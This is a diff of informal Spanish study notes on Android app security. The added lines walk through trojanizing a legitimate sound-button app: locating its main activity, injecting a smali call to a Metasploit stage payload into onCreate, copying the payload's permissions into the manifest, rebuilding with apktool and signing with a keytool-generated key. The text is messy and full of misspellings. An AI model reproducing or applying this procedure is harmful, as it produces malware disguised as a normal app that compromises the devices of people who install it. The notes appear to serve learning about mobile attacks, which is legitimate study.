@@ -5,8 +5,24 @@ carpera 100 sonidos listamos<br>
 y buscamos punto inicio aplicacioon legitima<br>
 grep -B2 "MAIN" AndroidManifest.xml<br>
 android:name="com.zeptars.soundbuttons.RunnerActivity"<br>
+<br>Buscamos este fichero
 
+<br><br>buscar onCreate inyectar inicio payload<br>
 invoke-static {p0}, Lcom/metasploit/stage/Payload;->start (Landroid/content/Context;)<br>
+Guardar
+abrir metaexploid 
+cat AndroidManifest.xml | grep "uses-permisoin"<br>
+en metaexploid 
+<br>copiar todos pernisos en AndroidManifest.xmlAndroidManifest.xml
+<br>apktool b 100sonidos
+crea la compliacion
+
+generar genkey
+keytool -genkey -v -keystore 100sonidos.keustore -alias 100sonidos -keyalg RSA -keysize 2048 -validity 10000
+pide password
+generamos certificado 
+
+
  
 
 <br># Mobile Security Framework (MobSF)<br>
